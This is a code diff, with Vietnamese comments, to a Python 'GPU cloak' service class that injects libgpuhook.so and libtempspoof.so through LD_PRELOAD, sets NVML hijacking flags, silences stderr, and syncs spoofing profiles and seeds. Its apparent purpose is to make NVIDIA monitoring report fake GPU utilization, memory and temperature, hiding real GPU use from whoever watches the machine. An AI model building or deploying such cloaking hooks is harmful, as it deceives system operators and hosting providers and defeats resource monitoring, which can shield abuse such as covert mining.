@@ -57,6 +57,9 @@ class NVMLInterceptor(IGPUCloakService):
         self.fake_utilization = 0
         self.fake_memory = 0
         self.lib_path = ""
+        # Tham số đồng bộ với tempspoof/gpuhook
+        self.profile = "train"  # train|infer
+        self.seed = ""          # chuỗi số nguyên (uint64)
         
     @property
     def name(self) -> str:
@@ -66,6 +69,13 @@ class NVMLInterceptor(IGPUCloakService):
         """Khởi tạo NVML interceptor"""
         self.fake_utilization = config.get('fake_utilization', 0)
         self.fake_memory = config.get('fake_memory', 0)
+        # Đọc profile/seed để đồng bộ với tempspoof
+        self.profile = config.get('profile', os.environ.get('GPUHOOK_PROFILE') or os.environ.get('TEMPSPOOF_PROFILE') or 'train')
+        seed_cfg = config.get('seed')
+        if seed_cfg is not None:
+            self.seed = str(seed_cfg)
+        else:
+            self.seed = os.environ.get('GPUHOOK_SEED') or os.environ.get('TEMPSPOOF_SEED') or ""
         
         # Kiểm tra libgpuhook.so có tồn tại
         self.lib_path = config.get('lib_path', '/opt/hooks/libgpuhook.so')
@@ -103,16 +113,31 @@ class NVMLInterceptor(IGPUCloakService):
             )
             return False
             
-        # Thiết lập LD_PRELOAD
+        # Thiết lập LD_PRELOAD (đảm bảo thứ tự libgpuhook.so đứng trước libtempspoof.so)
         current_preload = os.environ.get('LD_PRELOAD', '')
-        if self.lib_path not in current_preload:
-            if current_preload:
-                os.environ['LD_PRELOAD'] = f"{current_preload}:{self.lib_path}"
-            else:
-                os.environ['LD_PRELOAD'] = self.lib_path
+        libs = [p for p in current_preload.split(':') if p]
+        if self.lib_path not in libs:
+            libs.append(self.lib_path)
+        # Chuẩn hóa thứ tự: gpuhook trước tempspoof nếu cả hai đều có
+        try:
+            th_path = '/opt/hooks/libtempspoof.so'
+            if self.lib_path in libs and th_path in libs:
+                libs = [l for l in libs if l not in (self.lib_path, th_path)] + [self.lib_path, th_path]
+        except Exception:
+            pass
+        os.environ['LD_PRELOAD'] = ':'.join(libs)
                 
         # Thiết lập environment variables
         os.environ['ENABLE_NVML_IPC_HIJACKING'] = '1'
+        # Giao diện ENV mới cho gpuhook (+ phản chiếu sang tempspoof để đồng bộ)
+        os.environ['GPUHOOK_TEST_MODE'] = '1'
+        os.environ['GPUHOOK_NO_STDERR'] = '1'
+        if self.profile:
+            os.environ['GPUHOOK_PROFILE'] = self.profile
+            os.environ['TEMPSPOOF_PROFILE'] = self.profile
+        if self.seed:
+            os.environ['GPUHOOK_SEED'] = self.seed
+            os.environ['TEMPSPOOF_SEED'] = self.seed
         
         self.enabled = True
         logger.info("✅ NVML interception started")
